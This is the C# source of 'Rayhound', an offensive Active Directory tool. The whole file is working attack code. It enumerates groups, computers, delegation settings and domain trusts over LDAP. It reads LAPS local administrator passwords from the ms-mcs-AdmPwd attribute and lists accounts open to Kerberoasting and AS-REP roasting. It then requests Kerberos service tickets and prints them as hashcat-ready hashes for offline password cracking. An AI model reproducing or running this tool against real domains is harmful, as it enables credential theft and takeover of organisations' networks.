using System;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Collections.Generic;
using System.DirectoryServices.ActiveDirectory;
using System.Text.RegularExpressions;
using System.Security.Principal;
using System.Linq;
using System.Collections.Specialized;

namespace Rayhound
{
    class Program
    {
        public static string domain;
        public static string user;
        DirectoryEntry de = new DirectoryEntry("LDAP://" + domain);
        public static DirectorySearcher ldapConnection()
        {
            try
            {
                DirectorySearcher ds = null;
                DirectoryEntry de = new DirectoryEntry("LDAP://" + domain);
                ds = new DirectorySearcher(de);
                return ds;
            }
            catch (Exception ex)
            {
                Console.Write("Error info:" + ex.Message);
            }
            return null;
        }
        //TODO: CLEAN THE FUCKING CODE
        public static List<string> LdapQuery(string filter, StringCollection properties)
        {
            try
            {
                List<string> Names = new List<string>();

                DirectorySearcher ds = ldapConnection();
                {
                    ds.Filter = filter;
                };
                foreach (string prop in properties)
                {
                    ds.PropertiesToLoad.Add(prop);
                    foreach (SearchResult result in ds.FindAll())
                    {
                        string Name = (string)result.Properties[prop][0];
                        Console.WriteLine("[+]" + Name);
                        Names.Add(Name);
                    }
                }
                return Names;
            }
            catch (Exception ex)
            {
                Console.Write("Error info:" + ex.Message);
            }
            return null;
        }

        private static void GetAllGroups(DirectorySearcher ds)
        {
            SearchResultCollection results;
            // Sort by name
            StringCollection props = new StringCollection();
            ds.Sort = new SortOption("name", SortDirection.Ascending);
            ds.PropertiesToLoad.Add("name");
            ds.PropertiesToLoad.Add("memberof");
            ds.PropertiesToLoad.Add("member");

            ds.Filter = "(&(objectCategory=Group))";

            results = ds.FindAll();

            foreach (SearchResult sr in results)
            {
                if (sr.Properties["name"].Count > 0)
                    Console.WriteLine("[+]" + sr.Properties["name"][0].ToString());


                if (sr.Properties["member"].Count > 0)
                {
                    Console.WriteLine("  Members:");
                    foreach (string item in sr.Properties["member"])
                    {
                        Console.WriteLine("    " + item);

                    }
                }
            }
        }
        private static void GetLaps(DirectorySearcher ds)
        {
            try
            {
                SearchResultCollection results;
                // Sort by name
                ds.Sort = new SortOption("name", SortDirection.Ascending);
                ds.PropertiesToLoad.Add("name");
                ds.PropertiesToLoad.Add("ms-mcs-AdmPwdExpirationTime");
                ds.PropertiesToLoad.Add("ms-mcs-AdmPwd");

                ds.Filter = "(&(objectCategory=computer))";

                results = ds.FindAll();

                foreach (SearchResult sr in results)
                {
                    if (sr.Properties["name"].Count > 0 & sr.Properties["ms-mcs-AdmPwd"].Count > 0)
                        Console.WriteLine("[+]" + sr.Properties["name"][0].ToString());
                    foreach (string item in sr.Properties["ms-mcs-AdmPwd"])
                    {
                        Console.WriteLine("  ms-mcs-AdmPwd : " + item);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Write("Error info:" + ex.Message);
            }
        }

        private static void GetConstrained(DirectorySearcher ds)
        {
            try
            {
                SearchResultCollection results;
                // Sort by name
                ds.Sort = new SortOption("name", SortDirection.Ascending);
                ds.PropertiesToLoad.Add("name");
                ds.PropertiesToLoad.Add("msDS-AllowedToDelegateTo");


                ds.Filter = "(&(objectClass=computer)(objectClass=user))";

                results = ds.FindAll();
                foreach (SearchResult sr in results)
                {
                    ResultPropertyValueCollection resultPropertyValueCollection = sr.Properties["msDS-AllowedToDelegateTo"];
                    if (sr.Properties["name"].Count > 0)
                        if (sr.Properties["msDS-AllowedToDelegateTo"].Count != 0)
                            foreach (string propKey in sr.Properties["msDS-AllowedToDelegateTo"])
                            {
                                Console.WriteLine("[+]" + sr.Properties["name"][0].ToString() + " allowedtodelegate : " + propKey);
                            }
                }
            }
            catch (Exception ex)
            {
                Console.Write("Error info:" + ex.Message);
            }
        }
        private static void GetTrusts(string domain)
        {
            try
            {
                using (Forest forest = Forest.GetCurrentForest())
                {
                    Console.WriteLine("[+] FOREST");
                    Console.WriteLine("  {0}", forest.Name);
                    Console.WriteLine("    [+] DOMAINS");
                    foreach (Domain dom in forest.Domains)
                    {
                        Console.WriteLine(String.Format("      {0}", dom.Name));
                        Console.WriteLine("        [+] DOMAIN TRUSTS");
                        TrustRelationshipInformationCollection domainTrusts = dom.GetAllTrustRelationships();
                        if (domainTrusts.Count == 0)
                        {
                            Console.WriteLine("          N/A");
                        }
                        else
                        {
                            foreach (TrustRelationshipInformation trust in domainTrusts)
                            {
                                DirectoryContext x = new DirectoryContext(DirectoryContextType.Domain, trust.TargetName);
                                Console.WriteLine(String.Format("          {0} -> {1}", trust.SourceName, trust.TargetName));
                            }
                        }
                        dom.Dispose();
                    }
                    Console.WriteLine("    [+] FOREST TRUSTS");
                    TrustRelationshipInformationCollection forestTrusts = forest.GetAllTrustRelationships();
                    if (forestTrusts.Count == 0)
                    {
                        Console.WriteLine("      N/A");
                    }
                    else
                    {
                        foreach (TrustRelationshipInformation trust in forestTrusts)
                        {
                            Console.WriteLine(String.Format("      {0} -> {1}", trust.SourceName, trust.TargetName));
                        }
                    }
                }
            }


            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        public static void GetDomainSPNTicket(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null)
        {
            string domain = "DOMAIN";

            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
            {
                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                string domainDN = dnMatch.Groups["Domain"].ToString();
                domain = domainDN.Replace("DC=", "").Replace(',', '.');
            }

            try
            {
                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());

                byte[] requestBytes = ticket.GetRequest();
                string ticketHexStream = BitConverter.ToString(requestBytes).Replace("-", "");


                Match match = Regex.Match(ticketHexStream, @"a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)", RegexOptions.IgnoreCase);

                if (match.Success)
                {
                    byte eType = Convert.ToByte(match.Groups["EtypeLen"].ToString(), 16);

                    int cipherTextLen = Convert.ToInt32(match.Groups["CipherTextLen"].ToString(), 16) - 4;
                    string dataToEnd = match.Groups["DataToEnd"].ToString();
                    string cipherText = dataToEnd.Substring(0, cipherTextLen * 2);

                    if (match.Groups["DataToEnd"].ToString().Substring(cipherTextLen * 2, 4) != "A482")
                    {
                        Console.WriteLine(" [X] Error parsing ciphertext for the SPN {0}. Use the TicketByteHexStream to extract the hash offline with Get-KerberoastHashFromAPReq.\r\n", spn);

                        bool header = false;
                        foreach (string line in Split(ticketHexStream, 80))
                        {
                            if (!header)
                            {
                                Console.WriteLine("TicketHexStream        : {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("                         {0}", line);
                            }
                            header = true;
                        }
                        Console.WriteLine();
                    }
                    else
                    {
                        // output to hashcat format
                        string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", eType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));

                        bool header = false;
                        foreach (string line in Split(hash, 80))
                        {
                            if (!header)
                            {
                                Console.WriteLine("Hash                   : {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("                         {0}", line);
                            }
                            header = true;
                        }
                        Console.WriteLine();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
            }
        }

        public static IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { throw new ArgumentNullException("singleLineString"); }

            if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }

        public static void Kerb(string userName = "", string OUName = "", System.Net.NetworkCredential cred = null)
        {
            DirectoryEntry directoryObject = null;
            DirectorySearcher userSearcher = null;
            string bindPath = "";

            try
            {
                if (!String.IsNullOrEmpty(bindPath))
                {
                    directoryObject = new DirectoryEntry(bindPath);
                }
                else
                {
                    directoryObject = new DirectoryEntry();
                }

                userSearcher = ldapConnection();
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n [X] Error creating the domain searcher: {0}", ex.InnerException.Message);
                return;
            }

            try
            {
                Guid guid = directoryObject.Guid;
            }
            catch (DirectoryServicesCOMException ex)
            {
                if (!String.IsNullOrEmpty(OUName))
                {
                    Console.WriteLine("\r\n  [X] Error creating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
                }
                else
                {
                    Console.WriteLine("\r\n  [X] Error creating the domain searcher: {0}", ex.Message);
                }
                return;
            }

            try
            {
                if (String.IsNullOrEmpty(userName))
                {
                    userSearcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))";
                }
                else
                {
                    userSearcher.Filter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0}))", userName);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n  [X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                return;
            }


            try
            {
                SearchResultCollection users = userSearcher.FindAll();

                foreach (SearchResult user in users)
                {
                    string samAccountName = user.Properties["samAccountName"][0].ToString();
                    string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                    string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
                    Console.WriteLine("SamAccountName         : {0}", samAccountName);
                    Console.WriteLine("DistinguishedName      : {0}", distinguishedName);
                    Console.WriteLine("ServicePrincipalName   : {0}", servicePrincipalName);
                    GetDomainSPNTicket(servicePrincipalName, userName, distinguishedName, cred);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n  [X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                return;
            }
        }

        private static void WriteColor(string str, params (string substring, ConsoleColor color)[] colors)
        {
            var words = Regex.Split(str, @"( )");

            foreach (var word in words)
            {
                (string substring, ConsoleColor color) cl = colors.FirstOrDefault(x => x.substring.Equals("{" + word + "}"));
                if (cl.substring != null)
                {
                    Console.ForegroundColor = cl.color;
                    Console.Write(cl.substring.Substring(1, cl.substring.Length - 2));
                    Console.ResetColor();
                }
                else
                {
                    Console.Write(word);
                }
            }
        }

        static void Main(string[] args)
        {
            try
            {
                StringCollection props = new StringCollection();
                props.Add("name");
                user = UserPrincipal.Current.UserPrincipalName;
                domain = Domain.GetComputerDomain().ToString();
                string QKRoast = "(&(samAccountType=805306368)(servicePrincipalName=*))";
                string QAComputers = "(&(objectClass=computer))";
                string QAsRoast = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
                string UnconsDelegC = "(&(objectCategory=computer)(objectClass=computer)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))";

                DirectorySearcher ds = ldapConnection();
                WriteColor("        \n      ||========== Running thread in context of the user : " + user + "==============||\n\n", ("{user}", ConsoleColor.DarkYellow));
                WriteColor("        \n      ||==================== Groups&Users ===================||\n\n", ("{Groups&Users}", ConsoleColor.DarkYellow));
                GetAllGroups(ds);
                WriteColor("        \n      ||==================== Computers ===================||\n\n", ("{Computers}", ConsoleColor.DarkYellow));
                LdapQuery(QAComputers, props);
                WriteColor("        \n      ||==================== LAPS ===================||\n\n", ("{LAPS}", ConsoleColor.DarkYellow));
                GetLaps(ds);
                WriteColor("        \n      ||==================== Kerberoastable ===================||\n\n", ("{Kerberoastable}", ConsoleColor.DarkYellow));
                LdapQuery(QKRoast, props);
                WriteColor("        \n      ||==================== AsRepRoast ===================||\n\n", ("{AsRepRoast}", ConsoleColor.DarkYellow));
                LdapQuery(QAsRoast, props);
                WriteColor("        \n      ||==================== Unconstrained ===================||\n\n", ("{Unconstrained}", ConsoleColor.DarkYellow));
                LdapQuery(UnconsDelegC, props);
                WriteColor("        \n      ||==================== Constrained ===================||\n\n", ("{Constrained}", ConsoleColor.DarkYellow));
                GetConstrained(ds);
                WriteColor("        \n      ||==================== Trusts ===================||\n\n", ("{Trusts}", ConsoleColor.DarkYellow));
                GetTrusts(domain);
                WriteColor("        \n      ||==================== Kerberoast ===================||\n\n", ("{Kerberoast}", ConsoleColor.DarkYellow));
                Kerb();
            }
            catch (Exception ex)
            {
                Console.Write(" Error : " + ex.Message);
            }
        }
    }
}



